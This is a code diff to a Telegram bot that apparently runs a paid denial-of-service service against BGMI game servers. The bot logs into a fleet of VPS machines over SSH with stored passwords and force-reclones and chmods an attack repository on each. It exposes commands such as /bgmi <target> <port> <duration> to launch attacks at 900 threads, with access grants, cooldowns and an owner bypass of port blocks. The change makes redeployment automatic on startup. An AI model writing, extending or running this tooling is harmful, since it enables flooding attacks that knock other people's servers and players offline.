@@ -37,13 +37,20 @@ def deploy_single_vps(vps):
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=20)
-        clone_cmd = "git clone https://github.com/SagarExe/Clodways.git \~/Clodways 2>/dev/null || (cd \~/Clodways && git pull)"
-        chmod_cmd = "cd \~/Clodways && chmod +x *"
-        ssh.exec_command(clone_cmd)
-        time.sleep(8)
-        ssh.exec_command(chmod_cmd)
+        
+        # Force delete old repo + fresh clone + chmod every time
+        commands = [
+            "rm -rf \~/Clodways",
+            "git clone https://github.com/SagarExe/Clodways.git \~/Clodways",
+            "cd \~/Clodways && chmod +x *"
+        ]
+        
+        for cmd in commands:
+            ssh.exec_command(cmd)
+            time.sleep(2)  # small delay between commands
+        
         ssh.close()
-        logging.info(f"✅ Deployed/Updated Clodways on {vps['ip']}")
+        logging.info(f"✅ Fresh deploy done on {vps['ip']} (deleted + recloned + chmod)")
     except Exception as e:
         logging.error(f"Deploy error on {vps['ip']}: {e}")
 
@@ -51,6 +58,7 @@ def deploy_to_all_vps():
     for vps in vps_list:
         threading.Thread(target=deploy_single_vps, args=(vps,)).start()
 
+# Auto fresh deploy every time New.py starts
 deploy_to_all_vps()
 
 def remote_execute(vps, target, port, duration):
@@ -342,9 +350,9 @@ def deploy_command(message):
     if str(message.from_user.id) != OWNER_ID:
         bot.reply_to(message, "❌ Only owner can deploy.")
         return
-    bot.reply_to(message, "🚀 Deploying Clodways repo + chmod +x * to all VPS...")
+    bot.reply_to(message, "🚀 Force deleting + recloning Clodways on all VPS...")
     deploy_to_all_vps()
-    bot.reply_to(message, "✅ Deployment started on all VPS.")
+    bot.reply_to(message, "✅ Fresh deployment started on all VPS.")
 
 @bot.message_handler(commands=['stop_all'])
 def stop_all_command(message):
@@ -378,10 +386,7 @@ def start_command(message):
 
 🚀 Use /help to see the available commands and get started!
 
-🛡️ For assistance, contact tg = @skyline_offficial
-         owner = @wtf_vai
-
-Note: Unauthorized access is prohibited. Contact an admin if you need access.
+🛡️ For assistance, contact owner @wtf_vai
     """
     bot.reply_to(message, welcome_message, parse_mode='HTML')
 
@@ -404,7 +409,7 @@ def handle_bgmi(message):
         return
     int_port = int(port)
     BLOCKED_PORTS = {17000, 17500, 20000, 20001, 20002}
-    if str(caller_id) != OWNER_ID:  # Owner bypasses all port restrictions
+    if str(caller_id) != OWNER_ID:   # Owner bypasses all port blocks
         if int_port <= 10000 or int_port >= 30000 or int_port in BLOCKED_PORTS:
             bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
             return
@@ -478,7 +483,7 @@ def help_command(message):
 • /start - Welcome message
 • /help - This help
 • /bgmi <target> <port> <duration> - Launch attack
-• /deploy - Deploy Clodways to all VPS (Owner only)
+• /deploy - Force re-deploy Clodways (Owner only)
 • /stop_all - Stop all attacks (Owner only)
 • /when - Show active attacks
 • /grant <user_id> <duration> - Grant access (Owner only)
@@ -491,7 +496,7 @@ def help_command(message):
 • /set_cooldown <user_id> <minutes> - Set cooldown (Owner only)
 
 Threads fixed at 900.
-For assistance contact owner.
+Owner can use any port.
     """
     bot.reply_to(message, help_text)
 
